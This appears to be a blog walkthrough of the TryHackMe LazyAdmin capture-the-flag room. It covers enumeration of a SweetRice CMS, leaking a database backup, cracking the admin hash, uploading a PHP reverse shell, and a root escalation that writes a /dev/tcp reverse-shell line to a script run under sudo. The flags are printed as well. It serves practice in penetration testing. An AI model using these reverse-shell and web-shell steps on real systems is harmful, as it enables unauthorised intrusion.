---
title: "Challenges: LazyAdmin (TryHackMe)"
datePublished: Tue Jul 01 2025 20:29:30 GMT+0000 (Coordinated Universal Time)
cuid: cmckze6nx000202l21alkczms
slug: challenges-lazyadmin-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1751288828230/e55c63fa-e7ac-4f7c-86c1-f2f8ae69f23b.png
tags: tryhackme, cve, reverse-shell, ctf-writeup, privilege-escalation

---

In this walkthrough, we exploit a vulnerable machine titled [**Lazy Admin**](https://tryhackme.com/room/lazyadmin) on TryHackMe. The target is running a SweetRice CMS instance with known vulnerabilities. Our objectives are to gain user-level access and ultimately escalate privileges to retrieve both the **user** and **root flags**. The machine demonstrates real-world web exploitation techniques such as information disclosure through backup files, weak credential practices, and misconfigured sudo permissions. Through directory enumeration, credential discovery, reverse shell deployment, and privilege escalation, we gradually uncover the machine's weaknesses and learn practical pentesting skills.

## Lazy Admin

Have some fun! There might be multiple ways to get user access.

`Note: It might take 2-3 minutes for the machine to boot`

### What is the user flag? `THM{63e5bce9271952aad1113b6f1ac28a07}`

Checking the site, this is a note `/var/www/html/index.html`

`gobuster dir -u http://<IP_Address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751305248404/9c493ce9-5e0a-46ae-bead-44ec8c39c85d.png align="center")

`curl http://<IP_Address>/content/as/index.php/`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751305311014/0e1c7319-3227-46ec-b0b2-9888d02eb835.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751305629103/6d910b13-7235-4768-b1e7-a6fc8425fa14.png align="center")

SweetRice is a CMS, and we’ll check the CVEs linked to it on [Exploit Database](https://www.exploit-db.com/)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751394460182/d11d18ab-4cfd-4179-b4ca-9741e784addf.png align="center")

We’ll use this [CVE: SweetRice 1.5.1 - Backup Disclosure - PHP Webapp exploit](https://www.exploit-db.com/exploits/40718)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399559153/e094f81a-d8e9-4c59-a0e9-ff8909188695.png align="center")

[  
  
When we checked the `curl http://<IP_Address>/content/as/ind`](https://www.exploit-db.com/exploits/40718)`ex.php` There’s this part where the URL on the a tag has this `<a href=”./?type=password”></a>`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751397990870/a92f9987-b61f-4c64-9436-9f21730ed99e.png align="center")

`curl http://<IP_Address>/content/as/?type=password`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399634565/e0c0ac3d-ad92-4c7c-9eed-a5f7f2f64e23.png align="center")

We’ll try these web-exposed paths to find the leak

```bash
bash
CopyEdit
# These may expose DB backups, configs, or admin credentials
curl http://10.10.111.37/content/backup/
curl http://10.10.111.37/content/data/
curl http://10.10.111.37/content/inc/
curl http://10.10.111.37/content/attachment/
curl http://10.10.111.37/content/as/data/

# Look for:

# `.sql` files
# `.xml` or `.json` configs
# `users.xml`, `config.xml`, etc.
```

Gobuster had revealed `/inc`

`curl http://<IP_Address>/content/inc/`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399830554/c97d381e-b698-4e70-a36a-6ce13eb3c9fd.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400503056/ae76ebdc-5a76-4717-a0a3-d3a9ffb888aa.png align="center")

`curl http://<IP_Address>/content/inc/mysql_backup/`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399867268/711c7a47-6873-4c90-8c6d-b3010d2fcf8c.png align="center")

`curl http://<IP_Address>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql -o backup.sql`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399923753/1dee08c8-d9b6-4b21-8cda-5c432374d004.png align="center")

`cat backup.sql`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399948700/1b72adf3-d878-4dfe-9aa4-71f6ad3b320b.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751399971642/049eb1eb-9425-48d8-ac35-5011c741a2f8.png align="center")

You can access the backup.sql file on gists here: [backup.sql file on gists](https://gist.github.com/jebitok-dev/e243fd299de5fee92fd6073574dbf16d). This is our area of interest that reveals the credentials of the site (username and the password hash).  
  
  

```sql
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

  
Using the rainbow table, [CrackStation](https://crackstation.net/), we’ll reveal our password  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400180322/1496bdb1-84c2-4ac0-bdee-bfca2e49e19e.png align="center")

Visit the site http://&lt;IP\_Address&gt;/content/as/ and login using credentials: manager | Password123

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400256460/120aafaa-78db-4bd5-8c66-5fd24108fa38.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400273306/0096f6e1-3311-44de-9481-d234e78f8f13.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400289474/ca2e872c-a116-400c-82b1-d990a11c6c4c.png align="center")

Copy the `/usr/share/webshells/php/php-reverse-shell.php` file into a new file, e.g, shell.php, then edit using nano shell.php, change the &lt;IP\_Address&gt; to the attackbox one and the port to 4444. I tried uploading the PHP or PHP5 file to the create, but it didn’t escalate on the listening port.

`$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php5`

`$ nc -lvnp 4444` // on a different tab

Learned that there’s a media center that allows adding attachments/files, and it supports .phtml file, so I changed the file name to `shell.phtml` and uploaded it here. The listening port now allowed us to access the user itguy, and hence the user flag

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400591279/8948062a-b923-42c9-8c5e-47bb20390b0e.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400614055/369276be-4244-4590-9897-520e57d4c010.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400644215/d2271763-259f-4796-981f-84f71516422e.png align="center")

click on the shell.phtml file you’ve uploaded and move back to the terminal to check on the port 5555  
  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751400722485/7ab6836e-820c-49d5-b212-37232a06866f.png align="center")

`find / -type f -name user.txt 2> /dev/null`

`cat /home/itguy/user.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751401066350/e8f2fb39-f459-4b46-874a-8c7d78ad510f.png align="center")

### What is the root flag? `THM{6637f41d0177b6f37cb20d775124699f}`

`echo '#!/bin/bash' > /etc/`[`copy.sh`](http://copy.sh)

`echo 'bash -c '\''exec bash -i &>/dev/tcp/10.10.23.119/5555 <&1'\''' >> /etc/copy.sh`  
  
On the other tab, have nc -lvnp 5555 listening before you run the next command:

`sudo /usr/bin/perl /home/itguy/backup.pl`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751401210479/1d7d3a07-5ee3-4101-b2ba-e15c0856bd13.png align="center")

checking the other tab privileges would have been escalated to root

`whoami`

`find / -type f -name root.txt 2> /dev/null`

`cat /root/root.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751401416665/8ec3f0c0-d245-474b-ad00-aaa139deb87f.png align="center")

The Lazy Admin challenge showcases a classic example of poor security hygiene — from exposed backup files to weak credentials and dangerous sudo configurations. By leveraging a known CVE in SweetRice, performing methodical enumeration, and exploiting a poorly secured Perl script, we successfully gained initial access and escalated to root. This machine reinforces the importance of securing sensitive paths, using strong passwords, and limiting sudo access. Overall, it provides a great opportunity to practice web application exploitation and privilege escalation in a structured CTF environment.